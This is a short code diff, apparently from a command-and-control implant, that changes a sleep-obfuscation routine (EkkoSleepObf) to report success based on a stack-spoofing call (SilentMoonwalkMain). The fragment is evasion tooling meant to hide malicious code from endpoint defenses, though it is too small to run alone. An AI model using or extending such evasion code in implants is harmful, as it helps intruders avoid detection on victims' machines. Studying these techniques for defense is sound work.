@@ -188,16 +188,13 @@ BOOL EkkoSleepObf(
                     agent->Walker->FunctionPointer = agent->apis->pNtSignalAndWaitForSingleObject;
 
                     //stack spoofing enabled.
-                    SilentMoonwalkMain(agent->Walker->FunctionPointer, agent->Walker->Arguments, agent->Walker->RetAddr);
-
                     /* Wait for the sleep to end*/
-                    //if ((NtStatus = agent->apis->pNtSignalAndWaitForSingleObject(EvntStart, EvntDelay, FALSE, NULL)) < 0) {
-                    //    printf("[error] NtSignalAndWaitForSingleObject failed: %lx\n", NtStatus);
-                   //}
-                    //else {
-                        Success = TRUE;
 
-                    //}
+                    if(SilentMoonwalkMain(agent->Walker->FunctionPointer, agent->Walker->Arguments, agent->Walker->RetAddr)) {
+                        Success = TRUE;
+                    } else {
+                        Success = FALSE;
+                    }
                 }
                 else {
                     printf("[error] failed to create timer. %lx\n", NtStatus);
